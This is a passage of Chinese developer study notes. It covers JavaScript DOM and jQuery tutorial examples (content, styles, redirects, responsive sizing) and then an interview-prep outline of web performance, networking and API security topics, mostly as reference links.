            // inp_value = '';  // 改的只是一个内存变量
            inp.value = '';  // 清空输入框

            // 将内容赋值给h1 innerText | innerHTML
            // console.log(h1.innerText);
            // console.log(h1.innerHTML);
            // 纯文本
            // h1.innerText = inp_value;
            // 文本中的标签会被解析
            h1.innerHTML = inp_value;
        }
    }
</script>
</html>
js操作样式
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>样式操作</title>
    <style>
        .box {
            width: 200px;
            height: 200px;
            background-color: pink;
        }
        .sup-box {
            /*width: 400px;*/
            height: 100px;
            background-color: orange;
            border-radius: 50%;
            line-height: 100px;
            text-align: center;
            color: red;
        }
    </style>
</head>
<body>
    <!--<div class="box" style="background-color: deeppink;"></div>-->
    <div class="box">文本</div>
</body>
<script>
    let box = document.querySelector('.box');
    // 需求1：单击获取标签的之前背景颜色
    /*
    box.onclick = function () {
        // 注：this.style 本质操作的是行间式（只能获取和设置行间式）
        // bgColor = this.style.backgroundColor;
        // console.log(bgColor);

        // 注：在内联和外联中书写的样式称之为 计算后样式

        // 注：getComputedStyle 能获取计算后样式，也能获取行间式，但是只读
        // getComputedStyle(标签, 伪类).样式;
        bgColor = getComputedStyle(this, null).backgroundColor;
        console.log(bgColor);
        width = getComputedStyle(this, null).width;
        console.log(width, parseInt(width));

        // 只读，会报错
        // getComputedStyle(this, null).backgroundColor = 'rgb(255, 20, 147)';
    }
    */

    // 需求2：点击修改标签的宽高背景颜色
    /*
    box.onclick = function () {
        this.style.backgroundColor = 'orange';
        this_style = getComputedStyle(this, null);
        // console.log(parseInt(this_style.width) * 2);
        // 宽放大两倍，高缩小两倍
        this.style.width = parseInt(this_style.width) * 2 + 'px';
        this.style.height = parseInt(this_style.height) / 2 + 'px';
    }
    */
    
    // 需求：操作计算后样 - 提取写好计算后样式，通过类名将 js 与 css 建立关联
    box.onclick = function () {
        console.log(this.className);
        // this.className = 'sup-box';

        /*
        if (this.className === 'box') {
            this.className = 'sup-box';
        } else {
            this.className = 'box';
        }
        */
        // 注：有个空格：空格sup-box
        // this.className += ' sup-box';

        if (this.className === 'box') {
            this.className += ' sup-box';
        } else {
            this.className = 'box';
        }
    };
</script>
</html>
页面转跳
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>页面转跳</title>
</head>
<body>
    <button class="b1">自我刷新</button>
    <button class="b2">转跳到9</button>
    <button class="b3">ctrl新开转跳到9</button>
</body>
<script>
    window.owen = 'Owen';
    let b1 = window.document.querySelector('.b1');
    // 自我刷新
    b1.onclick = function () {
        // console.log(owen);

        // '' 代表当前页面链接
        // window.location.href = '';
        location.reload();
    };

    let b2 = window.document.querySelector('.b2');
    // 转跳到9*.html
    b2.onclick = function () {
        // 在自身所在标签替换
        window.location.href = '9、样式操作.html';
    };

    // ctrl新开转跳到9
    let b3 = window.document.querySelector('.b3');
    b3.onclick = function (ev) {
        // open('转跳路径', '默认就是_blank')
        if (ev.ctrlKey) {
            window.open('9、样式操作.html');
        } else {
            window.open('9、样式操作.html', '_self');
        }
    }
</script>
</html>
屏幕有滚动条下的两种宽度
去除滚动条剩余的全部宽度
let html = document.querySelector('html');
console.log(html.clientWidth);
不去除滚动条剩余的全部宽度
function getHtmlWidth() {
    let hidden = document.createElement('div');
    hidden.style.width = '100vw';
    html.appendChild(hidden);
    width = parseInt(getComputedStyle(hidden, null).width);
    html.removeChild(hidden);
    return width
}
width = getHtmlWidth();
console.log(width);
案例：动态尺寸
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>动态尺寸</title>
    <style>
        body {
            margin: 0;
            height: 3000px;
        }
        .box {
            /*width: 200px;*/
            /*height: 200px;*/
            /*width: 100%;*/

            background-color: orange;
            position: fixed;
            top: 0;
            left: 0;

            min-width: 900px;
            max-width: 1100px;

            width: 90%;
            margin-left: 5%;

            /*vw viewwidth  vh viewheight*/
            /*width: 90vw;*/
            /*margin-left: 5vw;*/
        }
    </style>
</head>
<body>
    <div class="hidden" style="width: 100vw"></div>
    <div class="box"></div>
</body>
<script>
    let html = document.querySelector('html');

    // 去除滚动条的宽度
    console.log(html.clientWidth);

    // 包含滚动条的宽度
    // let hidden = document.querySelector('.hidden');
    // width = parseInt(getComputedStyle(hidden, null).width);
    // console.log(width);

    function getHtmlWidth() {
        let hidden = document.createElement('div');
        hidden.style.width = '100vw';
        html.appendChild(hidden);
        width = parseInt(getComputedStyle(hidden, null).width);
        html.removeChild(hidden);
        return width
    }
    width = getHtmlWidth();
    console.log(width);



    function resizeBox() {
        box_width = parseInt(getComputedStyle(box, null).width);
        box.style.height = box_width / 6 + 'px';
        if (box_width >= 1100) {
            box.style.marginLeft = (html.clientWidth - 1100) / 2 + 'px'
        }
    }

    let box = document.querySelector('.box');
    resizeBox();

    window.onresize = function () {
        resizeBox();
    };
</script>
</html>
jq API
http://jquery.cuishifeng.cn/
jq初始
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>jq初始</title>
</head>
<body>
    <h1>jQuery就是js的工具库 - 一系列功能的集合体</h1>
    <h2>jq内部语法采用的就是原生js</h2>
    <h2>jq环境如何搭建 - 在需要使用jq的html中引入jquery.js即可</h2>
    <h2>jq就是优化了原生js鱼页面进行交互的逻辑</h2>
</body>

<!-- CDN 连接 外部资源 -->
<!--<script src="https://code.jquery.com/jquery-3.4.1.js"></script>-->
<!--<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>-->

<script src="js/jquery-3.4.1.js"></script>
<script>
    // jQuery对象
    console.log(jQuery);
    console.log($);
    console.log(Owen);

    console.log($('h1'));
    $('h1').click(function () {
        $('h1').css('color', 'red')
    })
</script>
</html>
jq选择器
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Title</title>
</head>
<body>
    <div id="d" class="box"></div>
    <input type="text" id="d2" class="box" />
    <h3 class="h3"></h3>
</body>
<script src="js/jquery-3.4.1.min.js"></script>
<script>
    // jq选择器：$('css选择器语法')
    let $div = $('#d');
    console.log($div);

    let $boxs = $('.box');
    console.log($boxs);

    // jq对象如何转换为js对象 - jq对象可以理解为装有js对象的数组
    // 就是通过索引取值
    let div = $div[0];
    console.log(div);

    console.log(document.getElementsByClassName('box')[0]);
    console.log(document.querySelectorAll('.box')[0]);
    console.log($div[0]);
    console.log($boxs[0]);
    console.log($boxs[1]);

    // js如何转换为jq对象
    let $newDiv = $(div);
    console.log($newDiv);

</script>
</html>
jq事件
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>jq事件</title>
    <style>
        .box {
            width: 200px;
            height: 200px;
            background-color: orange;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="box">1</div>
    <div class="box">2</div>
</body>
<script src="js/jquery-3.4.1.min.js"></script>
<script>
    let $box = $('.box');
    // $box.click(function () {
    //     // this就是被点击的标签 - js对象
    //     console.log(this);
    //     console.log($(this));
    // });

    // jq对象可以完成事件的批量绑定
    $box.on('click', function () {
        console.log(this);
        console.log(this.innerText);
        console.log($(this));
    });

    // js必须手动循环 绑定
    // let boxs = document.querySelectorAll('.box');
    // for (box of boxs) {
    //     box.onclick = function () {
    //         console.log(this);
    //         console.log($(this));
    //     }
    // }

</script>
</html>
jq内容操作
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>jq内容操作</title>
</head>
<body>
    <h1 class="title">标题</h1>
    <input type="text" class="title">
    <button class="btn">改标题</button>
</body>
<script src="js/jquery-3.4.1.min.js"></script>
<script>
    // js - jsObj.value | jsObj.innerText | jsObj.innerHTML
    // jq - jqObj.val() | jqObj.text() | jqObj.html()
    // 取值：jqObj.text() | jqObj.text('新值') | jqObj.text(fn)

    let $btn = $('.btn');
    let $inp = $('input.title');
    let $h1 = $('h1.title');

    $btn.click(function () {
        let val = $inp.val();
        if (val) {
            // $h1.text(val);
            $h1.html(val);
            $inp.val(function (index, oldValue) {
                // return oldValue.toUpperCase()
                return ''
            })
        }
    })
</script>
</html>
jq样式操作
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>jq样式操作</title>
    <style>
        .box {
            /*width: 200px;*/
            height: 200px;
            background-color: pink;
        }
        .sup-box {
            /*width: 400px;*/
            height: 100px;
            background-color: orange;
            border-radius: 50%;
            line-height: 100px;
            text-align: center;
            color: red;
        }
    </style>
</head>
<body>
    <div class="box" style="width: 600px">文本</div>
</body>
<script src="js/jquery-3.4.1.min.js"></script>
<script>
    let $box = $('.box');

    $box.click(function () {
        // 获取
        let width = $box.css('width');
        console.log(width);

        // 单个设置
        $box.css('background-color', function (i, o) {
            console.log(o);
            return 'red'
        });

        // 多条设置
        $box.css({
            width: '100px',
            height: '100px',
            backgroundColor: 'blue',
        });

        if ($box.hasClass('sup-box')) {
            $box.removeClass('sup-box')
        } else {
            $box.addClass(function (i, o) {
                console.log(i, o);
                return 'sup-box'
            })
        }
    })
    
</script>
<script>
    // localStorage['name'] = 'owen';
    // sessionStorage['age'] = 18;
</script>
</html>

```

### Ajax 请求（同步、异步区别）随机数禁止缓存
```
https://www.cnblogs.com/liu-zhao/p/7055250.html
```

### Bootstrap 有什么好处
```
https://www.php.cn/bootstrap/425318.html
```

### 跨域请求 N 种解决方案
```
https://www.cnblogs.com/momo798/p/6164124.html
```

### ES6
```
https://www.runoob.com/w3cnote/es6-tutorial.html
```

### 模块化
```
https://www.jianshu.com/p/8573cdcde863
```

### 打包
```
http://www.fly63.com/article/detial/3628
```

### 构建工具
```
https://www.cnblogs.com/lihuijuan/p/9296315.html
```

### vue、react、webpack、
```
http://www.97yrbl.com/portal.php?mod=view&aid=353
```

### 前端 mvc 
```
https://www.zhihu.com/question/267581572
https://segmentfault.com/a/1190000009127861
```

### 优化
```
https://www.cnblogs.com/tianshu/p/10555921.html
```

### 如何处理负载、高并发
```
从低成本、高性能和高扩张性的角度来说有如下处理方案：
1. HTML静态化
其实大家都知道，效率最高、消耗最小的就是纯静态化的html页面，
所以我们尽可能使我们的 网站上的页面采用静态页面来实现，这个最简单的方法其实也是最有效的方法。
2. 图片服务器分离
把图片单独存储，尽量减少图片等大流量的开销，可以放在一些相关的平台上，如骑牛等
3. 数据库集群和库表散列及缓存
数据库的并发连接为100，一台数据库远远不够，可以从读写分离、主从复制，数据库集群方面来着手。
另外尽量减少数据库的访问，可以使用缓存数据库如memcache、redis。
4. 镜像：
尽量减少下载，可以把不同的请求分发到多个镜像端。
5. 负载均衡：
Apache的最大并发连接为1500，只能增加服务器，可以从硬件上着手，如F5服务器。
当然硬件的成本比较高，我们往往从软件方面着手。
###*负载均衡**建立在现有网络结构之上，
它提供了一种廉价有效透明的方法扩展网络设备和服务器的带宽、增加吞吐量、加强网络数据处理能力，
同时能够提高网络的灵活性和可用性。目前使用最为广泛的负载均衡软件是Nginx、LVS、HAProxy。
- 知识点： [反向代理](https://www.cnblogs.com/Anker/p/6056540.html)
```

### 浏览器单域名并发数限制
```
https://www.cnblogs.com/sunsky303/p/8862128.html
```

### 静态资源缓存 304 （If-Modified-Since 以及 Etag 原理）
```
https://blog.csdn.net/lihongjun_0204/article/details/84096679
https://blog.csdn.net/weixin_43915587/article/details/95499873
```
### 多个小图标合并使用 position 定位技术 减少请求
```
https://blog.csdn.net/ldl_xz/article/details/84804133
```
### 静态资源合为单次请求 并压缩
```
https://www.cnblogs.com/LO-ME/p/7523596.html
```
### CDN
```
https://www.bejson.com/othertools/libcdn/
```
### 静态资源延迟加载技术、预加载技术
```
https://www.cnblogs.com/leyan/p/6085148.html
```
### keep-alive
```
https://www.jianshu.com/p/9523bb439950
```

### CSS 在头部，JS 在尾部的优化（原理）
```
https://www.cnblogs.com/straybirds/p/11108124.html
```

## 网络篇
### IP 地址转 INT
```
https://www.cnblogs.com/zhshlimi/p/10715911.html
https://www.cnblogs.com/shanyansheng/p/5580232.html
```
### 192.168.0.1/16 是什么意思
```
https://blog.csdn.net/aerchi/article/details/39396423?t=1476605876076
```
### DNS 主要作用是什么？
```
https://www.php.cn/faq/442356.html
```
### IPv4 与 v6 区别
```
https://www.php.cn/windows-414619.html
```

## 网络编程篇

### TCP 三次握手流程
```
https://blog.csdn.net/xuezhiwu001/article/details/78587439
```

### TCP、UDP 区别，分别适用场景
```
https://www.cnblogs.com/liangyc/p/11628208.html
```

### 有什么办法能保证 UDP 高可用性(了解)
```
https://blog.csdn.net/qq_37651267/article/details/93368908
```

### TCP 粘包如何解决？
```
https://blog.csdn.net/feng020a/article/details/60587726
```

### 为什么需要心跳？
```
https://www.cnblogs.com/coderzh/p/WhyHeartBeatNeeded.html
```

### 什么是长连接？
```
https://www.jb51.net/article/135006.htm
```

### HTTPS 是怎么保证安全的？
```
https://www.php.cn/safe/452112.html
```

### 流与数据报的区别
```
https://phpor.net/blog/post/1223
```

### 进程间通信几种方式，最快的是哪种？
```
https://blog.csdn.net/rorntuck7/article/details/84565211
```

### `fork()` 会发生什么？
```
https://zhidao.baidu.com/question/268326157628607205.html
```

## API 篇

### RESTful 是什么
```
https://www.runoob.com/php/php-restful.html
```

### 如何在不支持 `DELETE` 请求的浏览器上兼容 `DELETE` 请求
```
https://www.cnblogs.com/snandy/archive/2012/04/20/2459065.html
```

### 常见 API 的 `APP_ID` `APP_SECRET` 主要作用是什么？阐述下流程 
```
https://blog.csdn.net/qq_24656927/article/details/54910875
```

### API 请求如何保证数据不被篡改？
```
https://www.oschina.net/question/228530_2288017
```

### JSON 和 JSONP 的区别
```
https://www.cnblogs.com/bjfy/p/5461571.html
```

### 数据加密和验签的区别
```
https://www.jb51.net/article/62091.htm
```

### RSA 是什么
```
https://www.cnblogs.com/hzijone/p/6306818.html
```

### API 版本兼容怎么处理
```
https://www.cnblogs.com/vus520/p/3152772.html
```

### 限流（木桶、令牌桶）
```
https://www.jianshu.com/p/9f76dd2757c7
```

### OAuth 2 主要用在哪些场景下
```
https://blog.csdn.net/u33445687/article/details/107655728
```

### JWT
```
https://www.cnblogs.com/heyue0117/p/11917540.html
```

### PHP 中 `json_encode(['key'=>123]);` 与 `return json_encode([]);` 区别，会产生什么问题？如何解决
```
https://www.cnblogs.com/dadiaomengmei/p/11212344.html
```

## 加分项
### 了解常用语言特性，及不同场景适用性。
```
```

### PHP VS Golang
```
https://www.php.cn/be/go/421167.html
```

### PHP VS Python
```
https://blog.csdn.net/csdnnews/article/details/88373787
```

### PHP VS JAVA
```
https://www.cnblogs.com/itplay/p/10727690.html
```

### 了解 PHP 扩展开发
```
https://www.cnblogs.com/tosser/p/11564818.html
```

### 熟练掌握 C/C++
```
```
